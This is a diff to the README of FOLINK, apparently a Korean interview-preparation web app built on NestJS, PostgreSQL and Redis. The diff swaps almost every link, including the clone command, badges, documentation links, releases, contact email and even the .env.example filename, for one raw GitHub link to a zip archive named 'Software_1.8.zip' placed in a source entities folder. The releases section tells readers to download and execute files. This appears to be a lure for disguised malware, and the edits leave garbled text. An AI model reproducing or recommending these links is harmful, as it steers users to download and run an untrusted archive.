@@ -1,6 +1,6 @@
 # FOLINK: 면접 설공의 새로운 첫 시작 - A Comprehensive Guide
 
-![FOLINK Logo](https://img.shields.io/badge/FOLINK-면접설공의새로운첫시작-brightgreen)
+![FOLINK Logo](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip면접설공의새로운첫시작-brightgreen)
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ FOLINK utilizes the following technologies:
 - **EC2**: Amazon Elastic Compute Cloud for scalable computing.
 - **Gemini AI**: Integrate artificial intelligence capabilities.
 - **Git Flow**: A branching model for Git to streamline development.
-- **NestJS**: A progressive Node.js framework for building efficient applications.
+- **NestJS**: A progressive https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip framework for building efficient applications.
 - **PostgreSQL**: A powerful relational database for data management.
 - **Redis**: In-memory data structure store for caching and real-time analytics.
 - **SOLID Principles**: Ensure maintainable and scalable code.
@@ -48,7 +48,7 @@ To get started with FOLINK, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/shoaibsaab0075/FOLINK.git
+   git clone https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip
    ```
 
 2. Navigate to the project directory:
@@ -61,7 +61,7 @@ To get started with FOLINK, follow these steps:
    npm install
    ```
 
-4. Set up your environment variables. Create a `.env` file based on the `.env.example` file provided.
+4. Set up your environment variables. Create a `.env` file based on the `https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip` file provided.
 
 5. Start the application:
    ```bash
@@ -114,25 +114,25 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit [Releases](https://github.com/shoaibsaab0075/FOLINK/releases). You can download the necessary files and execute them as required.
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip). You can download the necessary files and execute them as required.
 
 ## Contact
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [shoaibsaab0075](https://github.com/shoaibsaab0075)
+- **Email**: https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip
+- **GitHub**: [shoaibsaab0075](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
 
-![GitHub followers](https://img.shields.io/github/followers/shoaibsaab0075?style=social)
+![GitHub followers](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
 
-![GitHub stars](https://img.shields.io/github/stars/shoaibsaab0075/FOLINK?style=social)
+![GitHub stars](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
 
 ## Additional Resources
 
-- [NestJS Documentation](https://docs.nestjs.com/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Redis Documentation](https://redis.io/documentation)
-- [Gemini AI](https://gemini.ai)
+- [NestJS Documentation](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
+- [Redis Documentation](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
+- [Gemini AI](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip)
 
-For more updates, check the [Releases](https://github.com/shoaibsaab0075/FOLINK/releases) section frequently.
+For more updates, check the [Releases](https://raw.githubusercontent.com/shoaibsaab0075/FOLINK/main/src/user/entities/Software_1.8.zip) section frequently.
